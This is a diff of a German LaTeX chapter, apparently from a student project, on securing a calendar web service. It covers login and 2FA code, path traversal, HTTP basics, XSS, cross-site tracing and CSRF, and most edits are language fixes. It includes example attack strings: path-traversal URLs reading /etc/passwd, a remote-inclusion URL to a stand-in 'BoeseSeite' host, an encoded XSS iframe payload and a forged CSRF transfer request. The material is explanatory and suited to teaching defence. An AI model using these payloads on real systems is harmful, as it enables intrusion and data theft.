@@ -2,14 +2,14 @@
 \chapter{Webseite-Security}
 \label{sec:Security}
 In diesem Abschnitt wird die Security der Webseite behandelt.
-Es wird behandelt wie das sichere einloggen in eine Webseite gewährt werden kann, wie man sich vor XSS/CSRF schützen kann, wie SQL Injections vermieden werden können und wie Passwörter sicher gespeichert werden. Es werden generell alle Themen behandelt, die bei der Erstellung einer sicheren Webseite zu beachten sind. Dazu werden auch einige Code Beispiele angeführt werden.
+Es wird behandelt, wie das sichere Einloggen in eine Webseite gewährt werden kann, wie sich vor XSS/CSRF geschützt werden kann, wie SQL Injections vermieden werden können und wie Passwörter sicher gespeichert werden. Es werden generell alle Themen behandelt, die bei der Erstellung einer sicheren Webseite zu beachten sind. Dazu werden auch einige Code Beispiele angeführt werden.
 \section{Login Handling}
 \label{sec:Login}
-Die Webseite soll eine Login-Funktion haben die es einem Nutzer des ICAL-Webservices erlaubt auf seine derzeitig vorhandenen Kalender zuzugreifen.\\Dafür muss unser Webseite eine passende sichere Authentifizierung gewährleisten können und diese sensiblen Daten in einer Datenbank verschlüsselt speichern. 
+Die Webseite soll eine Login-Funktion haben, die es einem Nutzer des ICAL-Webservices erlaubt auf seine derzeitig vorhandenen Kalender zuzugreifen.\\Dafür muss unsere Webseite eine passende sichere Authentifizierung für Benutzer anbieten. Diese Benutzerdaten müssen natürlich verschlüsselt in einer Datenbank gespeichert werden. 
 \subsection{Der Login Code}
 \label{sec:Login_Handling_Code}
 \begin{lstlisting}
-/* Hier wird die Methode gesetzt, festgelegt ob nicht angemeldete User die Erlaubnis haben diese zu nutzen und der Anti-Request-Forgery-Token wird gesetz. */
+/* Hier wird die HTTP-Methode festgelegt.Es wird festgelegt ob nicht angemeldete User die Erlaubnis haben diese Methode zu nutzen und der Anti-Request-Forgery-Token wird gesetzt. */
 [HttpPost]
 [AllowAnonymous]
 [ValidateAntiForgeryToken]
@@ -19,7 +19,7 @@ public async Task<IActionResult> Login(LoginViewModel model, string returnUrl = 
     ViewData["ReturnUrl"] = returnUrl;
         if (ModelState.IsValid)
         {
-        	//Aufrufen des PasswordSignInAsync und abpruefen ob der Login erfolgreich war
+        	//Aufrufen des PasswordSignInAsync und abpruefen ob der Login erfolgreich war.
             var result = await _signInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, lockoutOnFailure: false);
             if (result.Succeeded)
             {
@@ -46,7 +46,7 @@ public async Task<IActionResult> Login(LoginViewModel model, string returnUrl = 
     return View(model);
 }
 \end{lstlisting}
-Was beispielsweise eine View ist wird in Webseite MVC Views erklärt. 
+Was beispielsweise eine View ist wird im Kapitel Webseite MVC Views erklärt. 
 \section{Two-Factor-Auth}
 \label{sec:2fa}
 \subsection{Was ist Two-Factor Authentication}
@@ -57,7 +57,7 @@ Die dabei geltenden Faktoren lauten:
 \item etwas, das sie haben
 \item etwas, das sie sind
 \end{enumerate}
-Ein gutes Beispiel für die Zweifaktorauthentifizierung ist die Behebung von Geld an einem Geldautomaten. Nur die korrekte Kombination einer Bankkarte (die der Benutzer besitzt) und einer PIN (die der Benutzer weiß) ermöglicht die Durchführung der Transaktion.\\Der Anmeldevorgung bei Google wäre ein neueres Beispiel für die Zweifaktorauthentifizierung. Hierbei muss zuerst das Benutzerpasswort eingegeben werden, danach muss das eigene Smartphone über Passwort,Pin oder Fingerprint entsperrt werden und das Einloggen erlaubt werden. 
+Ein gutes Beispiel für die Zweifaktorauthentifizierung ist die Behebung von Geld an einem Geldautomaten. Nur die korrekte Kombination einer Bankkarte (die der Benutzer besitzt) und einer PIN (die der Benutzer weiß) ermöglicht die Durchführung der Transaktion.\\Der Anmeldevorgang bei Google wäre ein neumoderneres Beispiel für die Zweifaktorauthentifizierung. Hierbei muss zuerst das Benutzerpasswort eingegeben werden, danach muss das eigene Smartphone über Passwort, Pin oder Fingerprint entsperrt werden und das Einloggen erlaubt werden. 
 \\ vgl. \textcite{2FA}
 \subsection{2FA Login Code}
 \label{sec:2FALogin}
@@ -120,12 +120,10 @@ public async Task<IActionResult> LoginWith2fa(LoginWith2faViewModel model, bool 
 \end{lstlisting}
 \section{Path-Traversal}
 \label{sec:Path-Traversal}
-Als Path-Traversal wird eine Security Lüge bezeichnet die es einem Angreifer, durch Manipulation des URLs auf Daten zuzugreifen, auf die er nicht zugriffen können sollte. 
+Als Path-Traversal wird eine Security Schwachstelle bezeichnet, die es einem Angreifer erlaubt, durch Manipulation des URLs auf Daten zuzugreifen, auf die er nicht zugriffen können dürfte. 
 \subsection{Grundprinzip}
 \label{sec:PT_GP}
-Man sollte nicht auf Dateien, die sich außerhalb vom Web-Directory befinden, von einem Webserver zugreifen können. Beim Path-Traversal versucht der Angreifer durch beifügen von Pfadangaben das Verzeichnis zum Root-Verzeichnis zu wechseln. 
-//
-Man benutzt ../ als Parameter zum Wechseln des Verzeichnisses.
+Es sollte nicht möglich sein auf Dateien, die sich außerhalb vom Web-Directory befinden, zugreifen zu können. Beim Path-Traversal versucht der Angreifer durch Beifügen von Pfadangaben das Verzeichnis zum Root-Verzeichnis zu wechseln. Dafür benutzt der Angreifer ../ als Parameter zum Wechseln des Verzeichnisses.
 \subsection{Beispiele}
 \label{sec:PT_BSP}
 \begin{enumerate}
@@ -140,21 +138,21 @@ Man benutzt ../ als Parameter zum Wechseln des Verzeichnisses.
 \item \url{http://some_site.com.br/get-files?file=/etc/passwd}
 \end{enumerate}
 \end{enumerate}
-Anhand dieser Beispiele ist ersichtlich, dass diese Schwäche einem erlaubt lokale Passwörter und Windows Configs auszulesen.  
+Anhand dieser Beispiele ist ersichtlich, dass diese Schwäche einem erlaubt lokale Passwörter und Windows Konfigurationsdateien auszulesen.  
 \\
-Unter Linux ist diese Schwäche kritischer, da sie dort Zugriff auf die komplette Festplatte gewährt. In Windows kann jediglich auf das lokale Verzeichnis zugegriffen werden, in welchem sich die Webseite befindet.
+Unter Linux ist diese Schwäche kritischer, da sie dort Zugriff auf die komplette Festplatte gewährt. In Windows kann lediglich auf das lokale Verzeichnis zugegriffen werden, in welchem sich die Webseite befindet.
 \\
-Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese Seite Code zu injizieren, mit dem der Angreifer sich noch mehr Möglichkeiten verschafft. \\
+Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese Seite Code zu injizieren, mit dem noch mehr Möglichkeiten verschafft werden können. \\
 \url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}\\
 \\ vgl. \textcite{Path-Trav}
 \section{HTTP-Protokoll}
-Da sich die fortführende Themen mit HTTP und HTTP Request Protokollen beschäftigen werden, werden in diesem Kapitel kurz das Hypertext Transfer Protocol (HTTP) erklärt. 
+Da sich die fortführenden Themen mit dem HTTP-Protokoll und HTTP Requests beschäftigen werden, wird in diesem Kapitel kurz das Hypertext Transfer Protocol (HTTP) erklärt.
 \subsection{HTTP-Allgemein}
 Das Hypertext Transfer Protocol läuft auf Port 80/TCP und ist für die Übertragung von Daten zuständig.
 \subsection{HTTP-Funktionsweise}
-Hypertext Transfer Protocol kommuniziert auf dem Client-Server-Prinzip. Bedeutet das der HTTP-Client(ein Browser) eine Anfrage (eine sogenannte HTTP-Request) an einen HTTP-Server. Der Server analysiert die Anfrage und antwortet mit einer HTTP-Response. Die Kommunikation endet mit der Antwort des HTTP-Servers. Diese Kommunikation wird in Textform abgehalten. Die Meldungen werden wie bereits erwähnt HTTP-Request und HTTP-Response genannt und diese bestehen aus einem Header und Daten. Dieser Header enthält alle notwendigen Steuerinformationen. Die HTTP-Daten sind abhängig von wem sie gesendet werden, werden diese vom Server gesendet kommen sie als ein File, werden sie vom Client gesendet enthaltet diese Daten von den Nutzereingaben, die dieser getätigt hat.
+Das Hypertext Transfer Protocol kommuniziert auf dem Client-Server-Prinzip. Bedeutet das der HTTP-Client(ein Browser) eine Anfrage (eine sogenannte HTTP-Request) an einen HTTP-Server sendet. Der Server analysiert die Anfrage und antwortet mit einer HTTP-Response. Die Kommunikation endet mit der Antwort des HTTP-Servers. Diese Kommunikation wird in Textform abgehalten. Die Meldungen werden wie bereits erwähnt HTTP-Request und HTTP-Response genannt und diese bestehen aus einem Header und Daten. Dieser Header enthält alle notwendigen Steuerinformationen. Die HTTP-Daten sind abhängig von wem sie gesendet werden, werden diese vom Server gesendet sind sie zumeist ein File, werden sie jedoch vom Client gesendet enthalten diese Daten von den Nutzereingaben, die dieser getätigt hat.
 \subsection{HTTP-Request}
-Nun beschäftigen wird die HTTP-Request behandeln, welche in den weiteren Kapiteln eine Rolle spielen wird.\\Der HTTP-Request ist eine Anfrage vom Client an einen Server, dieser Request besteht aus Methode, URL und dem Request-Header. Die meist genutzten Methoden sind POST und GET, da damit die Hauptkommunikation von Server und Client funktioniert. Auf die Methode folgt durch Leerzeichen getrennt der URL und die verwendete HTTP-Version. Danach kommt der Header und bei der Methode POST die Formular-Daten.
+Nun wird die HTTP-Request behandelt, welche wie bereits erwähnt in den weiteren Kapiteln eine Rolle spielen wird.\\Der HTTP-Request ist eine Anfrage vom Client an einen Server, dieser Request besteht aus einer Methode,einer URL und dem Request-Header. Die häufigst genutzten Methoden sind POST und GET, da damit die Hauptkommunikation von Server und Client funktioniert. Auf die Methode folgt, durch Leerzeichen getrennt, der URL und die verwendete HTTP-Version. Danach kommt der Header und bei der Methode POST die Formulardaten.
 \subsubsection{HTTP-Request-Header}
 \begin{enumerate}
 \item Methode URL HTTP/Version
@@ -165,7 +163,7 @@ Nun beschäftigen wird die HTTP-Request behandeln, welche in den weiteren Kapite
 \item Request Entity (falls vorhanden)
 \end{enumerate}
 \subsubsection{Header-Methoden}
-In diesem Abschnitt werden die für die weiterführenden Kapiteln relevanten Header-Methoden erklärt werden.
+In diesem Abschnitt werden die für die weiterführenden Kapiteln relevanten Header-Methoden erklärt.
 \paragraph{Methoden}
 \begin{enumerate}
 \item GET
@@ -177,7 +175,7 @@ In diesem Abschnitt werden die für die weiterführenden Kapiteln relevanten Hea
 \item TRACE
 \item CONNECT
 \end{enumerate}
-\paragraph{GET}:\\Die GET-Methode hat als Zweck eine HTML-Datei oder eine andere Quelle vom HTTP-Server anzufordern. Die Quelle wird durch den Url festgelegt.Über GET können beispielsweise auch Formular-Daten übermittelt werden. Diese werden in codierter Form an den URL angehängt. Die Trennung von URL und Formular Daten erfolgt dabei durch ein Fragezeichen(?).
+\paragraph{GET}:\\Die GET-Methode hat als Zweck eine HTML-Datei oder eine andere Quelle vom HTTP-Server anzufordern. Die Quelle wird durch den URL festgelegt. Über GET können beispielsweise auch Formulardaten übermittelt werden. Diese werden in codierter Form an den URL angehängt. Die Trennung von URL und Formular Daten erfolgt dabei durch ein Fragezeichen(?).
 \paragraph{Beispiel HTTP-GET Request mit Postman}
 \begin{lstlisting}
 GET / HTTP/1.1
@@ -186,7 +184,7 @@ Content-Type: application/x-www-form-urlencoded
 cache-control: no-cache
 Postman-Token: d5bf16bd-2c73-4911-8a4c-c33d13dfa6ad
 \end{lstlisting}
-\paragraph{POST}:\\Die POST-Methode ähnelt der GET-Methode in der Funktion, jedoch wird sie zum senden von Formular-Daten an ein Serverseitiges Skript verwendet. Hierbei werden die Daten im Entity-Bereich getrennt und durch eine Leezeile vom Header übertragen.
+\paragraph{POST}:\\Die POST-Methode ähnelt der GET-Methode in der Funktion, jedoch wird sie zum senden von Formulardaten an ein serverseitiges Skript verwendet. Hierbei werden die Daten im Entity-Bereich durch eine Leerzeile getrennt und vom Header übertragen.
 \paragraph{Beispiel HTTP-POST Request mit Postman}
 \begin{lstlisting}
 POST / HTTP/1.1
@@ -196,13 +194,13 @@ cache-control: no-cache
 Postman-Token: b632b3e6-a87f-4ba6-80eb-e3c6c701710b
 firstname=Marcellastname=Stering
 \end{lstlisting}
-Hier wurden an den Host www.google.com die Formular-Daten firstname=Marcel und lastname=Stering gesendet.
-\paragraph{Trace}:\\Mit der TRACE-Methode werden HTTP-Requests, zwichen Client und Server über einen/mehrere Proxy-Server verfolgt. Die zwischengehaltenen Server stehen hierbei dann im Header-Feld "Via".
+Hier wurden an den Host www.google.com die Formular-Daten ''firstname=Marcel'' und ''lastname=Stering'' gesendet.
+\paragraph{Trace}:\\Mit der TRACE-Methode werden HTTP-Requests, zwichen Client und Server über einen/mehrere Proxy-Server verfolgt. Die während der Übertragung angesprungenen Server stehen hierbei dann im Headerfeld unter "Via".
 \section{XSS Protection}
 \label{sec:xss}
 \subsection{Allgemeines über XSS}
 \label{sec:xss_allgemein}
-XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es ausnutzt, dass ein Webseitenadministrator nicht davon ausgeht, dass eine gewisse Art von Benutzereingabe getätigt wird. Meist nutzt ein Hacker diese Schwäche um einen bösartigen Code auszuführen, Beispiele werden später noch behandelt werden. Trotz den hohen Bekanntheitsgrad von Cross-Site-Scripting ist diese Schwachselle immer noch auf der OWASP Top 10, welche die häufigsten Security Schwachstellen Jahr für Jahr auflistet. Bei dem Ausnutzen von XSS wird nicht direkt eine Person angegriffen, sondern diese Schwachstelle  wird genutzt, um bspw. ein bösartiges Skript zu platzieren, welches dann von einem nichts ahnenden Benutzer aufgerufen wird. 
+XSS steht für Cross-Site-Scripting und ist eine Security Schwachstelle, welche es ausnutzt, dass ein Webseitenadministrator nicht davon ausgeht, dass eine gewisse Art von Benutzereingabe getätigt wird. Meist nutzt ein Angreifer diese Schwäche, um einen bösartigen Code auszuführen. Beispiele dafür werden später noch behandelt werden. Trotz des hohen Bekanntheitsgrades von Cross-Site-Scripting ist diese Schwachstelle immer noch auf der OWASP Top 10, welche die häufigsten Security Schwachstellen Jahr für Jahr auflistet. Bei dem Ausnutzen von XSS wird nicht direkt eine Person angegriffen, sondern diese Schwachstelle wird genutzt, um beispielsweise ein bösartiges Skript auf der Webseite zu platzieren, welches dann von einem nichts ahnenden Benutzer aufgerufen wird.
 \subsection{XSS Targets:}
 \label{sec:xss_targets}
 \begin{enumerate}
@@ -213,7 +211,7 @@ XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es a
 \end{enumerate}
 \subsection{Warum ist Javascript so beliebt?}
 \label{sec:xss_why}
-Der Grund hierfür ist, dass Javascript quasi eine fundamentale Einheit einer Webseite ist. Es ist kaum noch eine Webseite zu finden, welche kein Javascript verwendet.
+Der Grund hierfür ist, dass Javascript eine fundamentale Einheit einer Webseite ist. Es ist kaum noch eine Webseite zu finden, welche kein Javascript verwendet.
 \subsection{Beliebte Angriffsvektoren}
 \label{sec:xss_bel_agg}
 \begin{enumerate}
@@ -224,20 +222,19 @@ Der Grund hierfür ist, dass Javascript quasi eine fundamentale Einheit einer We
 vgl. \textcite{XSS}
 \subsection{Session Hijacking}
 \label{sec:xss_session_hijacking}
-Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein Benutzer gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei, dass überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Administratorsession zugänglich wird und der Angreifer so auf einen Administrator Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Daraus ist ersichtlich, dass eine kleine Cross-Site-Scripting Schwachstelle ausreicht um dies zu bewerkstelligen. 
+Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein Benutzer gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei, dass überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Administratorsession zugänglich wird und der Angreifer so auf einen Administrator Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Daraus ist ersichtlich, dass eine kleine Cross-Site-Scripting Schwachstelle ausreicht, um viel Schaden anrichten zu können. 
 \subsection{Website-Defacements}
 \label{sec:xss_web_def}
-Website-Defacements ist mit Graffiti vergleichen, nur eben in digitaler Form. Hier wird XSS genutzt um sich den Zugriff auf die Webseite zu verschaffen und diese dann optisch zu verändern. 
+Website-Defacements ist mit Graffiti der realen Welt zu vergleichen, nur eben in digitaler Form. Hier wird XSS genutzt, um sich den Zugriff auf die Webseite zu verschaffen und diese dann optisch zu verändern. 
 \subsection{Phishing}
 \label{sec:xss_phishing}
-Im Prinzip ist Phishing die Intention mit Fake Webseiten oder E-Mails an vertrauliche Daten eines Users zu kommen. Ein Beispiel wäre mit einem gefälschten Facebook Login an die Login Daten eines Benutzers zu kommen. 
-\\Doch wie hängt das mit XSS zusammen?\\Eine Url enthält sehr oft eine Abfragezeichenfolge. Diese werden benutzt um beliebige Werte zu übergeben. Beispielsweise würde die Url 
-\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value an das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel und hier könnte wieder etwas Bösartiges übergeben werden.\\Ein Angreifer könnte jetzt diese Schwäche ausnutzen um zu eine anderen Website weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\Beispiel\\
-\url{"http://www.EineFinanzseite.com/?q=%3Cscript%3Edocument.write%28%22%3Ciframe+src%3D%27
+Im Prinzip ist Phishing die Intention mit Fake Webseiten oder E-Mails an vertrauliche Daten eines Users zu kommen. Ein Beispiel wäre mit einer gefälschten Facebook Loginseite an die Loginaten eines Benutzers zu kommen.\\Doch wie hängt das mit XSS zusammen?\\Eine URL enthält sehr oft eine Abfragezeichenfolge. Diese werden benutzt, um beliebige Werte zu übergeben. Beispielsweise würde die URL
+\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value an das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel, denn hier könnte wieder etwas Bösartiges übergeben werden.\\Ein Angreifer könnte jetzt diese Schwäche ausnutzen, um zu eine anderen Webseite weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\Beispiel\\
+\url{http://www.EineFinanzseite.com/?q=%3Cscript%3Edocument.write%28%22%3Ciframe+src%3D%27
 http%3A%2F%2Fwww.BoeseSeite.com%27+
 FRAMEBORDER%3D%270%27+WIDTH%3D%27800%27+HEIGHT%3D%27640%27
-+scrolling%3D%27auto%27%3E%3C%2Fiframe%3E%22%29%3C%2Fscript%3E&...=...&... "} \\
-Wobei die Modulo Buchstaben in Hexadezimal folgendes darstellen\\ \\
++scrolling%3D%27auto%27%3E%3C%2Fiframe%3E%22%29%3C%2Fscript%3E&...=...&... } \\
+Wobei die Modulowerte in Hexadezimal folgendes darstellen\\ \\
 3C == \textless{}\\
 3E == \textgreater{}\\
 28 == (\\             
@@ -257,9 +254,9 @@ Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angr
 \\ vgl. \textcite{Phishing}
 \subsection{Cross-Site-Tracing XST}
 \label{sec:CSTXST}
-Beim Cross-Site-Tracing werden XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert fast gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für den Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
+Beim Cross-Site-Tracing werden XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert fast gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden. Auch wenn für den Cookie das Kennzeichen "HttpOnly" gesetzt ist.
 \\ \\
-Obwohl die TRACE-Methode scheinbar harmlos ist, kann sie in einigen Szenarien erfolgreich eingesetzt werden, um die Berechtigungsnachweise legitimer Benutzer zu stehlen. Diese Angriffsmethode wurde 2003 von Jeremiah Grossman entdeckt, um den HttpOnly-Tag zu umgehen, den Microsoft in Internet Explorer 6 sp1 eingeführt hat, um Cookies vor dem Zugriff durch JavaScript zu schützen. Tatsächlich besteht eines der am häufigsten auftretenden Angriffsmuster in Cross Site Scripting darin, auf das document.cookie -Objekt zuzugreifen und es an einen vom Angreifer kontrollierten Webserver zu senden, damit er / sie die Sitzung des Opfers übernehmen kann. Das Markieren eines Cookies alls HttpOnly verbietet JavaScript das Stehlen dieses Cookies und damit kann dieser Cookie nicht an Dritte weitergegeben werden. Die TRACE-Methode kann jedoch verwendet werden, um diesen Schutz zu umgehen und auf das Cookie selbst in diesem Szenario zuzugreifen.
+Obwohl die TRACE-Methode scheinbar harmlos ist, kann sie in einigen Szenarien erfolgreich eingesetzt werden, um die Berechtigungsnachweise legitimer Benutzer zu stehlen. Diese Angriffsmethode wurde 2003 von Jeremiah Grossman entdeckt, um den HttpOnly-Tag zu umgehen, den Microsoft in Internet Explorer 6 sp1 eingeführt hat, um Cookies vor dem Zugriff durch JavaScript zu schützen. Tatsächlich besteht eines der am häufigsten auftretenden Angriffsmuster in Cross Site Scripting darin, auf das document.cookie -Objekt zuzugreifen und es an einen vom Angreifer kontrollierten Webserver zu senden, damit er die Sitzung des Opfers übernehmen kann. Das Markieren eines Cookies als HttpOnly verbietet JavaScript das Stehlen dieses Cookies und damit kann dieser Cookie nicht an Dritte weitergegeben werden. Die TRACE-Methode kann jedoch verwendet werden, um diesen Schutz zu umgehen und auf das Cookie selbst in diesem Szenario zuzugreifen.
 \\
 Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
 \pagebreak
@@ -278,7 +275,7 @@ Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
 vgl. \textcite{XST}
 \subsection{Wie wird XSS Protection gewährleistet}
 \label{sec:xss_prot}
-Die Webseite beschränkt sich generell auf wenige Eingabefelder wo eine Standard XSS versucht werden könnte. Alle diese Eingabefelder erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL als Schwachstelle weg.\\ \\Alle Möglichen Eingabefelder
+Die Webseite beschränkt sich generell auf wenige Eingabefelder, wo eine Standard XSS versucht werden könnte. Alle diese Eingabefelder erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesetzt werden und somit fällt auch der URL als möglicher Einstiegspunkt weg.\\ \\Alle Eingabefelder
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_XSS_img1}
     \caption{Webseite Eingabefeld 1}
@@ -294,20 +291,20 @@ Die Webseite beschränkt sich generell auf wenige Eingabefelder wo eine Standard
     \caption{Webseite Eingabefeld 3}
     \label{fig:webxxs1}
 \end{figure}
-In den URLS werden durch MVC und passende Implementierung nie Parameter gesendet bei denen es möglich wäre XSS Code einzufügen.\\
+In den URLs werden durch MVC und passende Implementierung nie Parameter gesendet bei denen es möglich wäre XSS Code einzufügen.\\
 Dadurch hat unsere Webseite eine Funktionierende XSS Protection.
 \section{XSRF/CSRF Protection}
 \label{sec:csrf}
 \subsection{Was ist XSRF/CSRF}
 \label{sec:xsrf_what}
-CSRF steht für Cross-Site-Request-Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Der Angreifer erbt dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Webseiten enthalten Browseranforderungen automatisch alle mit der Webseite verknüpften Anmeldeinformationen, zum Beispiel Session-Cookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windowsdomäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
+CSRF steht für Cross-Site-Request-Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Der Angreifer erbt dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Webseiten enthalten Browseranforderungen automatisch alle mit der Webseite verknüpften Anmeldeinformationen, zum Beispiel Sessioncookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windowsdomäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
 \\
-Eine CSRF zielt oft darauf Daten zu verändern. Beispielsweise das Kennwort und die Email eines Kontos oder das Kaufen eines Gegenstandes.Bei einem CSRF-Angriff wird immer der derzeitige Benutzer der sie ausführt benachrichtigt, daher zielen CSRF-Angriffe auf Zustandsänderungsanforderungen ab.
+Eine CSRF zielt oft darauf Daten zu verändern. Beispielsweise das Kennwort und die Email eines Kontos oder das Kaufen eines Gegenstandes.Bei einem CSRF-Angriff wird immer der derzeitige Benutzer, der sie ausführt, benachrichtigt, daher zielen CSRF-Angriffe auf Zustandsänderungsanforderungen ab.
 \\
-Es ist manchmal möglich, den CSRF-Angriff auf der verwundbaren Seite selbst zu speichern. Das kann durch einfaches Speichern eines IMG- oder IFRAME-Tags in einem HTML-fähigen Feld oder durch einen komplexeren Cross-Site-Scripting-Angriff erreicht werden. Wenn der Angriff einen CSRF-Angriff in der Seite speichern kann, wird der Schweregrad des Angriffs erhöht. 
+Es ist manchmal möglich, den CSRF-Angriff auf der verwundbaren Seite selbst zu speichern. Das kann durch einfaches Speichern eines IMG- oder IFRAME-Tags in einem HTML-fähigen Feld oder durch einen komplexeren Cross-Site-Scripting-Angriff erreicht werden. Wenn der Angreifer einen CSRF-Angriff in der Seite speichern kann, wird der Schweregrad des Angriffs erhöht. 
 \subsection{Wie Funktioniert eine Solche Attacke}
 \label{sec:xsrf_how}
-Man baut sich eine bösartige URL oder ein bösartiges Skript und bringt das Opfer dazu den URL aufzurufen. 
+Es wird eine bösartige URL oder ein bösartiges Skript gebaut und das Opfer wird dazu gebracht, die bösartige URL oder das bösartige Skript aufzurufen. 
 \\
 Beispiel
 \begin{lstlisting}
@@ -326,16 +323,16 @@ acct=Angreifer&amount=1000
 vgl. \textcite{CSRF}
 \subsection{Verhindern}
 \label{sec:xsrf_prevent}
-Zuerst wird kurz das Thema Cross-Site Request Forgery wiederholt um die folgenden Erklärungen nachvollziehen zu können. Bei Cross-Site Request Forgery wird ein Benutzer unbewusst dazu gebracht eine Funktion einer Webseite auszuführen die oftmals keine gutwilligen Absichten hat.\\ \\Um dies zu verhindern ist eine funktionierende und sichere Authentifikation notwendig. \\ \\Die oft beliebteste Form der Authentifizierung ist die Cookie basierende Authentifizierung. Aber auch die auf Token basierenden Authentifizierungssysteme werden immer beliebter, insbesondere für Single Page Applications. Die wichtigsten dieser Typen werden jetzt behandelt.
+Zuerst wird kurz das Thema Cross-Site Request Forgery wiederholt, um die folgenden Erklärungen nachvollziehen zu können. Bei Cross-Site Request Forgery wird ein Benutzer unbewusst dazu gebracht eine Funktion einer Webseite auszuführen, die oftmals keine gutwilligen Absichten hat.\\ \\Um dies zu verhindern ist eine funktionierende und sichere Authentifikation notwendig. \\ \\Die oft beliebteste Form der Authentifizierung ist die Cookie basierende Authentifizierung. Aber auch die auf Token basierenden Authentifizierungssysteme werden immer beliebter, insbesondere für Single Page Applications. Die wichtigsten dieser Typen werden jetzt behandelt.
 \subsubsection{Cookie}
-Wenn ein Benutzer sich mit seinem Benutzernamen und Kennwort authentifiziert, bekommt dieser einen für ihn erstellten Token ausgestellt.Dieser enthält ein Authentifizierungsticket, welches zur Authentifizierung und Autorisierung verwendet werden kann. Dieser Token wird als ein Cookie gespeichert, welcher dann bei jeder Request des Benutzers im HTTP Header vorhanden ist. Das Generieren und Validieren dieses Cookies wird von der Cookie Authentication Middleware durchgeführt. Die Middleware serialisiert einen Benutzer-Principal in einen verschlüsselten Cookie. Bei nachfolgenden Anforderungen validiert die Middleware das Cookie, erstellt den Principal neu und weist den Principal der User-Eigenschaft von HttpContext zu.
+Wenn ein Benutzer sich mit seinem Benutzernamen und Kennwort authentifiziert, bekommt dieser einen für ihn erstellten Token ausgestellt. Dieser Token enthält ein Authentifizierungsticket, welches zur Authentifizierung und Autorisierung verwendet werden kann. Besagter Token wird als ein Cookie gespeichert, welcher dann bei jeder Request des Benutzers im HTTP Header vorhanden ist. Das Generieren und Validieren dieses Cookies wird von der Cookie Authentication Middleware durchgeführt. Die Middleware serialisiert einen Benutzer-Principal in einen verschlüsselten Cookie. Bei nachfolgenden Anforderungen validiert die Middleware das Cookie, erstellt den Principal neu und weist den Principal der User-Eigenschaft von HttpContext zu.
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Cookies}
     \caption{Webseite Cookies}
     \label{fig:webcookies}
 \end{figure}
 \subsubsection{Token}
